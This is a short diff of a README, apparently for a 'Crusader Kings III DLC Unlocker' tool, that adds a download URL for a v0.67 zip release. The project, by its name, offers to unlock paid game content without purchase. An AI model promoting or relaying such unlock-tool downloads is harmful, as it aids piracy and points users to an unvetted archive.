@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.0.67 Release]() = `*Tool files & folder*`
+- [💾 v.0.67 Release](https://github.com/Crusader-Kings-III-DLC-Unlocker/.github/releases/download/v.0.67/ck3-dlc-manager.zip) = `*Tool files & folder*`
 
 ---
 
